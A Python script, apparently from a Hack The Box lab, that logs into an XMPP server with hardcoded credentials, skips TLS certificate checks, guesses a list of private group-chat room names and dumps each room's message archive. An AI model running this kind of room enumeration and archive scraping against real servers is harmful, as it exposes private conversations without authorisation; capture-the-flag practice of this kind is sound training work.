import asyncio, ssl, logging
from slixmpp import ClientXMPP
logging.basicConfig(level=logging.CRITICAL)
HOST="10.129.4.51"; PORT=5222
JID="zytglogge88@murknet.htb"; PW="TickTock24!"; NICK="swissclock"
CAND=["op_snatch","op_sparkling","snatch","sparkling","opsnatch","opsparkling",
      "operations","command","commands","directives","private","affiliates",
      "members","core","inner","ops","opsec","field"]

class H(ClientXMPP):
    def __init__(self):
        super().__init__(JID, PW)
        for p in ['xep_0030','xep_0045','xep_0313']:
            self.register_plugin(p)
        self.ssl_context.check_hostname=False; self.ssl_context.verify_mode=ssl.CERT_NONE
        self.add_event_handler("session_start", self.start)
        self.done=asyncio.Event()
    async def start(self, ev):
        self.send_presence()
        muc=self.plugin['xep_0045']
        for r in CAND:
            room=f"{r}@groups.murknet.htb"
            try:
                await muc.join_muc(room, NICK)
                await asyncio.sleep(0.6)
                # try to read MAM
                msgs=[]
                async for m in self.plugin['xep_0313'].iterate(jid=room):
                    try:
                        st=m['mam_result']['forwarded']['stanza']
                        if st['body']: msgs.append((str(m['mam_result']['forwarded']['delay']['stamp']), str(st['from']), st['body']))
                    except: pass
                if msgs:
                    print(f"\n### JOINED+MAM {room} ({len(msgs)} msgs)")
                    for d,f,b in msgs: print(f"[{d}] <{f}> {b}")
                else:
                    print(f"[joined empty] {room}")
            except Exception as e:
                es=str(e)[:60]
                if 'not-allowed' not in es and 'forbidden' not in es and 'registration-required' not in es:
                    print(f"[{room}] {es}")
        self.disconnect(); self.done.set()

async def main():
    x=H(); x.add_event_handler("disconnected", lambda e:x.done.set())
    x.connect(HOST,PORT)
    try: await asyncio.wait_for(x.done.wait(), timeout=100)
    except asyncio.TimeoutError: print("[-] timeout")
asyncio.run(main())
